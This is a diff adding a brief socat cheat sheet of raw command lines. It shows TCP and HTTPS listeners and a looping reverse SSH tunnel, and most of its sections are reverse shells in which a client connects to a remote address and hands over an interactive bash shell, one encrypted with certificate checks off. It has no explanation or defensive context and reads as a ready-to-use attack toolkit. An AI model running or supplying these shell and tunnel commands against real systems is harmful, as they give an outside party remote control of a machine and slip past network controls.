@@ -1,0 +1,21 @@
+# socat examples
+
+
+# ssh port forwarding
+server: socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr
+client: while true; do socat TCP4:[IP_ADDR]:443 TCP4:127.0.0.1:22 ; done
+
+# listen https
+socat openssl-listen:443,reuseaddr,fork -
+socat openssl-listen:443,reuseaddr,cert=server.crt,key=server.key,verify=0 -
+
+# listen tcp
+socat TCP-LISTEN:4444,reuseaddr,fork -
+
+# reverse https shell
+server: socat `tty`,raw,echo=0 openssl-listen:4444,reuseaddr,cert=server.pem,verify=0
+client: socat openssl-connect:[IP_ADDR]:4444,verify=0 exec:bash,pty,stderr,setsid
+
+# reverse tcp shell
+server: socat `tty`,raw,echo=0 TCP-LISTEN:4444,reuseaddr
+client: socat tcp-connect:[IP_ADDR]:4444 exec:bash,pty,stderr,setsid
